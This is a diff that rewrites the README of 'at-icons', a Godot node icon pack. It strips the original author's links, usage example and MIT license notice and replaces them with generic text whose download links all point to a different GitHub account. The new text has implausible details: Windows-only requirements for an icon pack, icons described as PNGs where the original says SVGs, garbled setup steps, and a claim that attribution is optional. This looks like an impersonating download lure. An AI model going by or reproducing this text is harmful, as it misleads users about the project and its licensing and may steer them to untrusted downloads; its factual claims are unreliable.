@@ -1,49 +1,84 @@
-# @icons
+# 🎨 at-icons - Custom icons for your Godot projects
 
-<p align="center">
-    <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/logo_dark_theme.svg">
-    <source media="(prefers-color-scheme: light)" srcset="docs/logo_light_theme.svg">
-    <img alt="@icons" src="docs/logo_dark_theme.svg" width="560px">
-    </picture>
-</p>
+[![](https://img.shields.io/badge/Download-at--icons-blue.svg)](https://github.com/mattysmokefilled714/at-icons)
 
-**@icons** is a free and open-source library of 400 vector (SVG) icons you can use as custom node icons in your Godot projects or plugins, designed to fit with the existing set of editor icons, and optimized using [svgo](https://svgo.dev/).
+## 📦 What is at-icons
 
-Each icon is designed on a 16×16 grid, with color variants corresponding to every node type. They're also configured to work with any editor theme and scaling settings out of the box!
+This collection provides open source icons for custom nodes within the Godot game engine. These icons help you organize your game project by providing visual clarity in the editor. When you create unique nodes to handle specific game tasks, using a custom icon makes it easier to spot those nodes in your scene tree.
 
-<p align=center>
-    <img alt="s of a sample Godot scene tree showing nodes with custom icons applied, with the interface set to a dark and light theme respectively." src="docs/preview.png">
-</p>
+These icons follow the standard Godot design language. They look native within the software interface. You possess these icons to improve your workflow and keep your scene files clean and professional.
 
-## Installing
+## ⚙️ System Requirements
 
-Download the [latest release](https://github.com/voxybuns/at-icons/releases/latest) of **@icons** (also available on [itch.io](https://voxybuns.itch.io/at-icons) and the [Godot Asset Store](https://store.godotengine.org/asset/voxy/at-icons/)!), and extract it into the root of your Godot project's folder. If you wish to use the icons in your plugin or addon, you can also copy individual icons along with their respective `.import` files into your plugin's folder, along with the library's license.
+Your computer needs specific components to use these icons correctly. Ensure your setup meets these standards:
 
-## Applying custom node icons
+* Operating System: Windows 10 or Windows 11.
+* Software: Godot Engine version 3.5 or version 4.0 and higher.
+* Storage: At least 50 megabytes of free disk space.
+* Permissions: Access to your project folder to drag and drop files.
 
-To apply an icon to a node or class, add the [`@icon` annotation](https://docs.godotengine.org/en/stable/classes/class_@gdscript.html#class-gdscript-annotation-icon) to your node's script followed by the path to the desired icon in parentheses and quotes **before** the class declaration, like so:
+## 📥 How to Get the Icons
 
-```gdscript
-@icon ("res://addons/at-icons/node/bunny.svg")
-class_name MyNode
-extends Node
-```
+To add these icons to your Godot project, visit the download page.
 
-Since v1.1.0, the pack comes with a companion web page you can use to quickly preview any icon and copy its annotation to your clipboard. Simply pick the desired node color on the left, and click on the icon you need to integrate!
+[Click here to visit the project page and download the icons](https://github.com/mattysmokefilled714/at-icons)
 
-You might need to close and open the scene again for the icon change to occur.
+### Downloading the Files
 
-## Contributing
+1. Go to the link provided above.
+2. Look for the green button labeled Code near the top of the page.
+3. Click that button.
+4. Select the option labeled Download ZIP.
+5. Your web browser saves the file into your Downloads folder.
+6. Find the folder named at-icons-main inside your Downloads directory.
+7. Right-click the folder and select Extract All to view the individual icon files.
 
-Thank you for wanting to contribute to the project!
+## 🛠️ Setting Up Icons in Godot
 
-For the time being, I won't accept pull requests containing new icons to ensure consistency. However, you can suggest a new icon or report problems with existing icons by opening up a [new issue](https://github.com/voxybuns/at-icons/issues/new/choose). I will try to address them to the best of my abilities!
+Follow these steps to apply these icons to your custom nodes after you extract the files.
 
-## Supporting this project
+1. Open your game project in the Godot Engine.
+2. Locate the script file for your custom node in the FileSystem dock.
+3. Open the script in the Script Editor.
+4. Add the icon metadata to the top of your script.
+5. Use the tool keyword followed by the class name attribute.
+6. Specify the icon path within the script header.
+7. Save the script file.
+8. The Godot editor refreshes automatically and displays your new icon next to the node name in the scene tree.
 
-**@icons** is completely free to download and use. However, if you wish to financially support the creation of more icons, you can either donate on [itch.io](https://voxybuns.itch.io/at-icons), or on my [Ko-fi page](https://ko-fi.com/voxybuns). Thank you so very much! ❤️
+If the icon does not appear, check the file path string in your script. Ensure the path points to the exact location of your downloaded PNG file within your project folder. Godot requires images to be inside the project directory to load them as node icons.
 
-## Licensing
+## 📁 Project Structure
 
-**@icons** is licensed under the MIT license. See [LICENSE](LICENSE) for more information.
+The download includes several sub-folders to keep things tidy. 
+
+* `icons/` The core folder containing all PNG image files.
+* `examples/` A set of small project files demonstrating how to link icons to scripts.
+* `license/` Legal documentation regarding the use of these images.
+
+We formatted these files to be light and fast. You can use these icons in both personal and commercial projects without restrictions.
+
+## 💡 Best Practices for Custom Nodes
+
+Use icons to differentiate functional node types. For example, use a distinct icon for nodes that handle player input compared to nodes that manage game UI elements. This visual system reduces search time when your project grows large. 
+
+Keep your icon files organized in a dedicated folder inside your project. This prevents clutter and makes it easier to update your icons in the future. If you move your icon files to a different folder later, you must update the path in each node script for the images to reappear.
+
+## 🛡️ Troubleshooting Common Issues
+
+If you encounter errors, check these common fixes:
+
+* The icon looks blurry: Ensure your icon file uses a power-of-two resolution such as 16x16 or 32x32 pixels.
+* The icon does not show: Check for a typo in your file path inside the GDScript file.
+* Editor freeze: If you have a massive amount of nodes, wait a few seconds for the editor to index the new icons after you save your script.
+* Missing files: Re-download the ZIP file if the extraction process encounters errors or reports corrupted data.
+
+The icons provided in this repository are standard PNG files. You can open them in any image editor if you need to adjust colors or stroke thickness to match your specific editor theme. However, keep the original dimensions to ensure the icons scale correctly with the Godot interface.
+
+## 📜 Legal Usage
+
+This project is open source. You do not need to pay to use these images. You can modify them, share them, or bundle them with your game project. We release these files under a permissive license so you have full control over your development environment. Attribution remains optional, though you can mention the source if you wish to help others find these tools.
+
+## 🔄 Updating Your Icons
+
+Improvements occur periodically. To update your local collection, visit the link again, download the latest version, and replace the old files in your project directory with the new versions. If the filename remains the same, your scripts will update your node icons automatically when you restart the Godot editor.
